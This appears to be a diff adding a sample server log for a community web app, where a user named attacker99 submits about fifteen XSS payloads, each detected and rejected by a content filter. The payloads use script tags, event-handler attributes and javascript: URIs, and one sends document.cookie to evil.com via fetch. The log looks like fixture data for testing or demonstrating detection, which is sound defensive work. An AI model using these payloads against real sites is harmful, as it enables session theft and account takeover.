@@ -1,0 +1,124 @@
+[2026-01-05 15:00:00] INFO Server is running on port 3333
+[2026-01-05 15:00:01] INFO Database connected successfully
+[2026-01-05 15:00:05] INFO GET /api/posts?page=1&limit=10 200 - 42ms
+[2026-01-05 15:00:08] INFO POST /login 200 - 118ms - User: user001
+[2026-01-05 15:00:10] INFO GET /api/profile 200 - 34ms - User: user001
+[2026-01-05 15:00:12] INFO POST /api/posts 201 - 145ms - User: user001
+[2026-01-05 15:00:15] INFO GET /api/notifications 200 - 38ms - User: user001
+[2026-01-05 15:00:18] INFO GET /api/posts/25 200 - 31ms
+[2026-01-05 15:00:20] INFO POST /api/comments 201 - 87ms - User: user001
+[2026-01-05 15:00:23] INFO GET /api/chat/rooms 200 - 44ms - User: user001
+[2026-01-05 15:00:25] INFO POST /login 200 - 122ms - User: attacker99
+[2026-01-05 15:00:28] INFO GET /api/posts?page=2&limit=10 200 - 47ms
+[2026-01-05 15:00:30] INFO POST /api/posts - User: attacker99
+[2026-01-05 15:00:30] WARN Dangerous HTML content detected: <script>alert('XSS')</script>
+[2026-01-05 15:00:30] ERROR POST /api/posts 400 - 22ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 15:00:33] INFO PUT /api/posts/12 200 - 98ms - User: user001
+[2026-01-05 15:00:35] INFO GET /api/emoticons/sets 200 - 36ms
+[2026-01-05 15:00:38] INFO POST /api/posts - User: attacker99
+[2026-01-05 15:00:38] WARN Dangerous HTML content detected: <img src=x onerror=alert(1)>
+[2026-01-05 15:00:38] ERROR POST /api/posts 400 - 20ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 15:00:40] INFO GET /api/health 200 - 5ms
+[2026-01-05 15:00:43] INFO DELETE /api/comments/33 200 - 69ms - User: user001
+[2026-01-05 15:00:45] INFO POST /login 200 - 115ms - User: user002
+[2026-01-05 15:00:48] INFO GET /api/profile/stats 200 - 52ms - User: user001
+[2026-01-05 15:00:50] INFO POST /api/comments - User: attacker99
+[2026-01-05 15:00:50] WARN Dangerous HTML content detected: <svg onload=alert(1)>
+[2026-01-05 15:00:50] ERROR POST /api/comments 400 - 19ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 15:00:53] INFO POST /api/posts/18/like 200 - 43ms - User: user002
+[2026-01-05 15:00:55] INFO GET /api/notices?page=1&limit=5 200 - 40ms
+[2026-01-05 15:00:58] INFO GET /api/categories/available 200 - 29ms
+[2026-01-05 15:01:00] INFO POST /api/chat/message 201 - 75ms - User: user001
+[2026-01-05 15:01:03] INFO GET /api/posts?category=tech 200 - 54ms
+[2026-01-05 15:01:05] INFO POST /api/posts - User: attacker99
+[2026-01-05 15:01:05] WARN Dangerous HTML content detected: javascript:void(0)
+[2026-01-05 15:01:05] ERROR POST /api/posts 400 - 18ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 15:01:08] INFO PUT /api/comments/56 200 - 90ms - User: user002
+[2026-01-05 15:01:10] INFO GET /api/posts/9 200 - 35ms
+[2026-01-05 15:01:13] INFO POST /register 201 - 234ms - User: user003
+[2026-01-05 15:01:15] INFO GET /api/chat/messages/room-123 200 - 61ms - User: user001
+[2026-01-05 15:01:18] INFO POST /api/posts - User: attacker99
+[2026-01-05 15:01:18] WARN Dangerous HTML content detected: <iframe src=javascript:alert(1)>
+[2026-01-05 15:01:18] ERROR POST /api/posts 400 - 21ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 15:01:20] INFO GET /api/posts?page=3&limit=10 200 - 48ms
+[2026-01-05 15:01:23] INFO PUT /api/profile/password 200 - 180ms - User: user002
+[2026-01-05 15:01:25] INFO GET /api/notifications 200 - 39ms - User: user003
+[2026-01-05 15:01:28] INFO POST /api/posts 201 - 148ms - User: user003
+[2026-01-05 15:01:30] INFO GET /api/profile 200 - 32ms - User: user001
+[2026-01-05 15:01:33] INFO POST /api/comments - User: attacker99
+[2026-01-05 15:01:33] WARN Dangerous HTML content detected: <body onload=alert('XSS')>
+[2026-01-05 15:01:33] ERROR POST /api/comments 400 - 22ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 15:01:35] INFO DELETE /api/posts/14 200 - 72ms - User: user002
+[2026-01-05 15:01:38] INFO GET /api/health 200 - 5ms
+[2026-01-05 15:01:40] INFO POST /api/posts/21/like 200 - 44ms - User: user003
+[2026-01-05 15:01:43] INFO GET /api/emoticons/sets 200 - 37ms
+[2026-01-05 15:01:45] INFO POST /api/posts - User: attacker99
+[2026-01-05 15:01:45] WARN Dangerous HTML content detected: <input onfocus=alert(1) autofocus>
+[2026-01-05 15:01:45] ERROR POST /api/posts 400 - 20ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 15:01:48] INFO POST /api/comments 201 - 88ms - User: user001
+[2026-01-05 15:01:50] INFO GET /api/posts?page=4&limit=10 200 - 49ms
+[2026-01-05 15:01:53] INFO PUT /api/posts/7 200 - 95ms - User: user003
+[2026-01-05 15:01:55] INFO GET /api/profile 200 - 33ms - User: user002
+[2026-01-05 15:01:58] INFO POST /login 200 - 119ms - User: user004
+[2026-01-05 15:02:00] INFO GET /api/notifications 200 - 40ms - User: user004
+[2026-01-05 15:02:03] INFO POST /api/comments - User: attacker99
+[2026-01-05 15:02:03] WARN Dangerous HTML content detected: <script>document.cookie</script>
+[2026-01-05 15:02:03] ERROR POST /api/comments 400 - 23ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 15:02:05] INFO GET /api/chat/rooms 200 - 46ms - User: user004
+[2026-01-05 15:02:08] INFO POST /api/chat/message 201 - 74ms - User: user001
+[2026-01-05 15:02:10] INFO GET /api/posts/28 200 - 36ms
+[2026-01-05 15:02:13] INFO DELETE /api/comments/67 200 - 68ms - User: user002
+[2026-01-05 15:02:15] INFO GET /api/profile/stats 200 - 51ms - User: user003
+[2026-01-05 15:02:18] INFO POST /api/posts - User: attacker99
+[2026-01-05 15:02:18] WARN Dangerous HTML content detected: <img src=x onerror=fetch('http://evil.com?c='+document.cookie)>
+[2026-01-05 15:02:18] ERROR POST /api/posts 400 - 24ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 15:02:20] INFO POST /api/posts 201 - 152ms - User: user004
+[2026-01-05 15:02:23] INFO GET /api/categories/available 200 - 28ms
+[2026-01-05 15:02:25] INFO GET /api/posts?category=news 200 - 56ms
+[2026-01-05 15:02:28] INFO PUT /api/comments/82 200 - 91ms - User: user001
+[2026-01-05 15:02:30] INFO GET /api/health 200 - 5ms
+[2026-01-05 15:02:33] WARN Security alert: User attacker99 attempted 10 XSS attacks
+[2026-01-05 15:02:35] INFO POST /api/posts/15/like 200 - 43ms - User: user002
+[2026-01-05 15:02:38] INFO GET /api/notices 200 - 41ms
+[2026-01-05 15:02:40] INFO GET /api/emoticons/sets 200 - 36ms
+[2026-01-05 15:02:43] INFO POST /api/comments 201 - 87ms - User: user004
+[2026-01-05 15:02:45] INFO GET /api/posts?page=1&limit=20 200 - 68ms
+[2026-01-05 15:02:48] INFO PUT /api/profile/password 200 - 182ms - User: user001
+[2026-01-05 15:02:50] INFO GET /api/chat/messages/room-456 200 - 59ms - User: user002
+[2026-01-05 15:02:53] INFO POST /register 201 - 228ms - User: user005
+[2026-01-05 15:02:55] INFO GET /api/posts/42 200 - 34ms
+[2026-01-05 15:02:58] INFO POST /api/posts - User: attacker99
+[2026-01-05 15:02:58] WARN Dangerous HTML content detected: <svg><script>alert(1)</script></svg>
+[2026-01-05 15:02:58] ERROR POST /api/posts 400 - 22ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 15:03:00] INFO DELETE /api/posts/19 200 - 73ms - User: user003
+[2026-01-05 15:03:03] INFO GET /api/health 200 - 5ms
+[2026-01-05 15:03:05] INFO POST /api/posts/11/like 200 - 44ms - User: user005
+[2026-01-05 15:03:08] INFO GET /api/notifications 200 - 38ms - User: user005
+[2026-01-05 15:03:10] INFO POST /api/posts 201 - 149ms - User: user001
+[2026-01-05 15:03:13] INFO GET /api/profile 200 - 33ms - User: user004
+[2026-01-05 15:03:15] INFO POST /api/comments - User: attacker99
+[2026-01-05 15:03:15] WARN Dangerous HTML content detected: <object data="javascript:alert(1)">
+[2026-01-05 15:03:15] ERROR POST /api/comments 400 - 21ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 15:03:18] INFO GET /api/chat/rooms 200 - 45ms - User: user002
+[2026-01-05 15:03:20] INFO POST /api/chat/message 201 - 76ms - User: user003
+[2026-01-05 15:03:23] INFO GET /api/posts?category=tech 200 - 53ms
+[2026-01-05 15:03:25] INFO PUT /api/posts/23 200 - 96ms - User: user005
+[2026-01-05 15:03:28] INFO GET /api/posts/6 200 - 32ms
+[2026-01-05 15:03:30] INFO POST /api/posts - User: attacker99
+[2026-01-05 15:03:30] WARN Dangerous HTML content detected: <a href="javascript:alert(1)">Click</a>
+[2026-01-05 15:03:30] ERROR POST /api/posts 400 - 20ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 15:03:33] INFO DELETE /api/comments/91 200 - 67ms - User: user001
+[2026-01-05 15:03:35] INFO GET /api/profile/stats 200 - 52ms - User: user004
+[2026-01-05 15:03:38] INFO POST /api/posts 201 - 151ms - User: user002
+[2026-01-05 15:03:40] INFO GET /api/categories/available 200 - 29ms
+[2026-01-05 15:03:43] INFO GET /api/health 200 - 5ms
+[2026-01-05 15:03:45] INFO POST /api/comments - User: attacker99
+[2026-01-05 15:03:45] WARN Dangerous HTML content detected: <button onclick="alert(1)">
+[2026-01-05 15:03:45] ERROR POST /api/comments 400 - 19ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 15:03:48] INFO POST /api/posts/29/like 200 - 42ms - User: user005
+[2026-01-05 15:03:50] INFO GET /api/notices 200 - 40ms
+[2026-01-05 15:03:53] INFO GET /api/emoticons/sets 200 - 35ms
+[2026-01-05 15:03:55] INFO POST /api/comments 201 - 89ms - User: user003
+[2026-01-05 15:03:58] INFO GET /api/posts?page=2&limit=20 200 - 69ms
+[2026-01-05 15:04:00] WARN Security alert: User attacker99 attempted 15 XSS attacks total
+[2026-01-05 15:04:00] WARN Recommend blocking user: attacker99 (IP: 192.168.1.251)
